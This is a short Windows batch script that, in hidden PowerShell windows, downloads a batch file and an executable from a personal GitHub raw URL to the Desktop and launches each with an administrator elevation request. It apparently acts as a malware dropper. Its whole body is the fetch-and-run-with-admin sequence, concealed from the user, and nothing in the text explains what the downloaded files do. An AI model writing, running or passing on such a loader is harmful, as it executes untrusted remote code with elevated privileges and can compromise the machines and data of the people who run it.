@echo off
set "url1=https://raw.githubusercontent.com/sabeloe/script/main/tenp.bat"
set "url4=https://raw.githubusercontent.com/sabeloe/script/main/wind.exe"
set "output1=%USERPROFILE%\Desktop\211.bat"
set "output4=%USERPROFILE%\Desktop\210.exe"


powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%'"


powershell -WindowStyle Hidden -Command "Start-Process '%output1%' -Verb runAs"

timeout /t 40 /nobreak


powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url4%' -OutFile '%output4%'"


powershell -WindowStyle Hidden -Command "Start-Process '%output4%' -Verb runAs"



